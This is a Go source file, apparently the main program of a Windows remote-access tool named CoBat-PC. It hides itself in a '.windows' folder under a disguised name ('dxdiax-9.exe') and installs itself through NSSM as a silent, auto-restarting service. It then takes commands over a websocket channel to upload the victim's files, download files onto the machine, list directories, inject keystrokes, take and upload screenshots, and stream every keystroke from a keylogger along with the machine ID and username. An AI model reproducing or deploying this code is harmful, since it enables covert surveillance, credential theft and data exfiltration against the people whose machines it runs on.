package main

import (
	"CoBat-PC/emulate"
	"CoBat-PC/filemanager"
	"CoBat-PC/keylogger"
	"CoBat-PC/notification"
	"CoBat-PC/screen"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/centrifugal/centrifuge-go"
	"github.com/denisbrodbeck/machineid"
)

var currentMachineID string
var currentUsername string

type eventHandler struct{}

func (h *eventHandler) OnConnect(c *centrifuge.Client, e centrifuge.ConnectEvent) {
	log.Printf("client connected")
}

func (h *eventHandler) OnDisconnect(c *centrifuge.Client, e centrifuge.DisconnectEvent) {
	log.Println("client diconnected")
	fmt.Println(e.Reason)
}

type subEventHandler struct{}

func (h *subEventHandler) OnPublish(sub *centrifuge.Subscription, e centrifuge.PublishEvent) {

	var command map[string]interface{}
	err := json.Unmarshal(e.Data, &command)
	if err != nil {
		log.Println(err)
		return
	}

	if _, ok := command["return_type"]; ok {
		return
	}

	sourceType := command["source_type"].(string)
	commandType := command["command_type"].(string)

	switch sourceType {
	case "emulate":
		if commandType == "keyboard" {
			args := command["args"].(string)
			keyBind := []int{}
			for _, val := range strings.Split(args, ",") {
				intVal, err := strconv.Atoi(val)
				if err == nil {
					keyBind = append(keyBind, intVal)
				}
			}
			emulate.Type(keyBind)
		}
	case "fm":
		if commandType == "upload-to-server" {
			args := command["args"].(map[string]interface{})
			path := args["path"].(string)

			info, err := os.Stat(path)
			if err == nil {
				link := filemanager.Upload(path)
				if link != "" {
					slice := strings.Split(path, "\\")
					if len(slice) > 0 {
						slice = slice[:len(slice)-1]
					}

					retData := map[string]interface{}{
						"addr":          link,
						"file":          !info.IsDir(),
						"name":          info.Name(),
						"size_kb":       info.Size() / 1000,
						"working_dir":   strings.Join(slice, "\\"),
						"last_modified": info.ModTime().Unix(),
						"return_type":   "danilla-file",
						"device_id":     currentMachineID,
						"deploy_id":     deployID,
						"username":      currentUsername,
					}

					jsonRaw, err := json.Marshal(retData)
					if err == nil {
						sub.Publish(jsonRaw)
					}
				}
			}
		}
		if commandType == "download-to-device" {
			args := command["args"].(map[string]interface{})
			// https://xxx.com/x.zip-UwU-C:\Users\WHO\Download
			filemanager.Download(args["link"].(string), args["path"].(string))
		}
		if commandType == "list" {
			args := command["args"].(map[string]string)

			depth, err := strconv.Atoi(args["depth"])
			if err == nil {
				list := filemanager.ListChild(args["parent"], depth)
				retData := map[string]interface{}{
					"list":        list,
					"return_type": "danilla-fm-list",
					"device_id":   currentMachineID,
					"deploy_id":   deployID,
					"username":    currentUsername,
				}

				jsonRaw, err := json.Marshal(retData)
				if err == nil {
					sub.Publish(jsonRaw)
				}
			}
		}
	case "keylogger":
		args := command["args"].(map[string]interface{})

		if _, ok := args["duration"]; ok {
			duration := args["duration"].(float64)

			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Minute)
			defer cancel()

			kl := keylogger.NewKeylogger()

		BREAKER:
			for {
				select {
				case <-ctx.Done():
					break BREAKER
				default:
					key := kl.GetKey()

					if !key.Empty {
						go func() {
							retData := map[string]interface{}{
								"pressed_at":  time.Now().Unix(),
								"key":         fmt.Sprintf("%c", key.Rune),
								"return_type": "danilla-keylog",
								"device_id":   currentMachineID,
								"username":    currentUsername,
								"deploy_id":   deployID,
							}

							jsonRaw, err := json.Marshal(retData)
							if err == nil {
								sub.Publish(jsonRaw)
							}
						}()
					}

					time.Sleep(500 * time.Microsecond)
				}
			}
		}
	case "notification":
		if commandType == "toast" {
			args := command["args"].(map[string]interface{})
			go notification.ShowToast("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\WindowsPowerShell\\v1.0\\powershell.exe", args["title"].(string), args["message"].(string))
		}
	case "screen":
		if commandType == "screenshot" {
			link := screen.CaptureAndUpload()
			if link != "" {
				retData := map[string]interface{}{
					"captured_at": time.Now().Unix(),
					"addr":        link,
					"return_type": "danilla-screenshot",
					"device_id":   currentMachineID,
					"username":    currentUsername,
					"deploy_id":   deployID,
				}

				jsonRaw, err := json.Marshal(retData)
				if err == nil {
					sub.Publish(jsonRaw)
				}
			}
		}
	}
}

const is64Bit = uint64(^uintptr(0)) == ^uint64(0)

func main() {

	id, err := machineid.ID()
	if err != nil {
		log.Fatal(err)
	}

	currentMachineID = id

	binPath, err := os.Executable()
	if err != nil {
		panic(err)
	}

	usr, err := user.Current()
	if err != nil {
		panic(err)
	}

	currentUsername = usr.Username

	mPath := usr.HomeDir + "\\" + ".windows"

	if _, err := os.Stat(mPath); os.IsNotExist(err) {
		// path/to/whatever does not exist
		os.Mkdir(mPath, os.ModePerm)
		nssm := mPath + "\\" + "uwu-winrar.zip"

		err = filemanager.Download("https://nssm.cc/release/nssm-2.24.zip", nssm)

		if err != nil {
			return
		}

		Unzip(nssm, mPath)

		nssmPath := ""
		if is64Bit {
			nssmPath = mPath + "\\nssm-2.24\\win64\\nssm.exe"
		} else {
			nssmPath = mPath + "\\nssm-2.24\\win32\\nssm.exe"
		}

		binNewPath := mPath + "\\dxdiax-9.exe"
		MoveFile(binPath, binNewPath)

		service := "dxdiax-9"
		// execute nssm command for sambu file watcher
		err := exec.Command(nssmPath, "install", service, binNewPath).Run()
		if err != nil {
			fmt.Println(err)
			return
		}

		exec.Command(nssmPath, "set", service, "Start", "SERVICE_AUTO_START").Run()
		exec.Command(nssmPath, "set", service, "AppNoConsole", "1").Run()
		exec.Command(nssmPath, "set", service, "AppPriority", "HIGH_PRIORITY_CLASS").Run()
		exec.Command(nssmPath, "set", service, "AppThrottle", "0").Run()
		exec.Command(nssmPath, "set", service, "AppRestartDelay", "0").Run()
		exec.Command(nssmPath, "set", service, "AppExit", "Default", "Restart").Run()
		exec.Command(nssmPath, "restart", service).Run()
		exec.Command(nssmPath, "start", service).Run()

		os.Exit(1)
	}

	url := "ws://localhost:8000/connection/websocket?format=protobuf"

	c := centrifuge.New(url, centrifuge.DefaultConfig())
	defer c.Close()

	// c.SetToken("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJIZWxsYm95IiwiaWF0IjoxNTg1MjUzNjk0LCJleHAiOjE3MTE0ODQwOTQsImF1ZCI6IiIsInN1YiI6IiIsIkdpdmVuTmFtZSI6IkpvaG5ueSJ9.2xuP0yHQIeh_J6dvIdBOaKFzzDCQO7pWbLbw8PM-qF8")

	eventHandler := &eventHandler{}
	c.OnConnect(eventHandler)
	c.OnDisconnect(eventHandler)

	err = c.Connect()
	if err != nil {
		log.Fatalln(err)
	}

	// const channel = "REPLACE_THIS_WITH_CHANNEL"
	channel := "public:" + deployID
	sub, err := c.NewSubscription(channel)
	if err != nil {
		log.Fatalln(err)
	}

	err = sub.Subscribe()
	if err != nil {
		log.Println(err)
	}

	subEventHandler := &subEventHandler{}
	sub.OnPublish(subEventHandler)

	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	<-ch
}
